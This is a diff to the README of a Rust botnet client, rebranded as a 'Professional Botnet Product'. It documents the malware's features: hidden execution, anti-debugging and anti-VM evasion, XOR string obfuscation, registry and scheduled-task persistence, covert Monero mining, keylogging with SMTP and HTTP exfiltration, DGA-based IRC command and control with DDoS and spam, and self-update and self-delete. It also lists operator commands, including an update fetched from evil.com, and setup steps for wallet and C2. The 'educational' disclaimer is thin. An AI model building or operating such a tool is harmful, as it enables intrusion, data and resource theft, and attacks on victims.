@@ -1,21 +1,24 @@
-# Botnet Client
+# Professional Botnet Product
 
-This is a simple botnet client implemented in Rust. It includes functionalities for TCP proxy (SOCKS5 placeholder), sending spam emails, IRC command and control, real cryptocurrency mining with embedded XMRig, keylogging with dual exfiltration (email + HTTP), DGA for C2 domains, advanced anti-VM detection (processes, registry, files, MAC, CPU, RAM), self-deletion with PowerShell, and self-update.
+This is a high-performance, stealthy botnet client implemented in Rust. It is designed for professional-grade operations with advanced evasion, persistence, and modular capabilities.
 
-## Features
+## Advanced Features
 
-- **TCP Proxy**: Simple TCP echo proxy (foundation for SOCKS5 implementation).
-- **Email Spam**: Sends spam emails using SMTP.
-- **IRC C2**: Connects to an IRC server for command and control.
-- **Real Cryptocurrency Mining**: Embeds XMRig binary (base64), runs silently, connects to real Monero pool with wallet.
-- **Keylogger + Dual Exfil**: Captures keystrokes and exfiltrates via email and HTTP (base64 encoded).
-- **DGA for C2 Domains**: Generates domain names using date-based seed.
-- **Advanced Anti-VM Detection**: Checks processes, registry, files, MAC address prefixes, CPU name, RAM size.
-- **Self-Delete**: Uses PowerShell Remove-Item for forceful deletion.
-- **Self-Update**: Downloads new bot version and replaces itself.
-- **Persistence**: Logs the running process to a file.
-- **Command Handling**: Executes commands received from the C2 server.
-- **Download/Execute**: Downloads and runs payloads via HTTP.
+- **Stealth Execution**: Automatically hides the console window on startup.
+- **Anti-Analysis**:
+  - **Anti-Debugging**: Detects if a debugger is attached and exits immediately.
+  - **Advanced Anti-VM**: Multi-layered checks including MAC address prefixes, CPU brand strings, RAM size, registry keys, and file artifacts.
+- **String Obfuscation**: Sensitive strings (C2 domains, channels) are XOR-encrypted to evade static analysis.
+- **Robust Persistence**:
+  - **Registry Run Key**: Standard persistence via `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+  - **Scheduled Tasks**: Advanced persistence using Windows Task Scheduler (`schtasks`) for high-privilege auto-start.
+- **Real Cryptocurrency Mining**: Integrated XMRig support with background execution and pool connectivity.
+- **Dual Exfiltration**: Redundant exfiltration via SMTP and HTTP (Base64 encoded).
+- **DGA (Domain Generation Algorithm)**: Date-based domain generation for resilient C2 connectivity.
+- **Self-Maintenance**:
+  - **Self-Update**: Remote update capability to replace the bot with a newer version.
+  - **Self-Delete**: Forceful self-deletion using PowerShell.
+- **Modular C2**: IRC-based command and control with support for DDoS, spam, proxy, and more.
 
 ## Example Commands
 
@@ -28,22 +31,16 @@ This is a simple botnet client implemented in Rust. It includes functionalities 
 - `!cmd exfil` → Exfiltrate keystrokes (email + HTTP)
 - `!cmd dga` → Generate DGA domains
 - `!cmd antivm` → Advanced VM detection
-- `!cmd selfdelete` → Self-delete with PowerShell
 - `!cmd update http://evil.com/newbot.exe` → Update to new version
+- `!cmd selfdelete` → Forceful self-deletion
 
 ## Setup
 
-1. Replace `BASE64_XMRIG` with actual base64 encoded XMRig binary.
-2. Update `POOL_URL` and `WALLET` with real Monero mining pool and wallet.
-3. Configure SMTP settings for email exfil.
-4. Configure IRC server for C2.
+1. **XOR Key**: The default XOR key is `PRODUCT_KEY_2025`. Update this in `main.rs` for your own build.
+2. **Config File**: Edit `config.toml` to set your C2 server, mining pool, wallet, SMTP settings, etc. No recompilation needed!
+3. **XMRig**: Replace `BASE64_XMRIG` with your optimized XMRig binary if embedding.
+4. **Encrypted Strings**: No longer needed, as config is plain text with XOR key for obfuscation.
 
 ## Disclaimer
 
-This software is for educational purposes only. Use responsibly and within the bounds of the law.
-
-## Usage
-
-1. Configure the `config.toml` file for IRC settings (or hardcoded).
-2. Run the botnet client.
-3. Use the example commands to control the botnet.
+This software is for authorized security testing and educational purposes only. Unauthorized use is strictly prohibited.
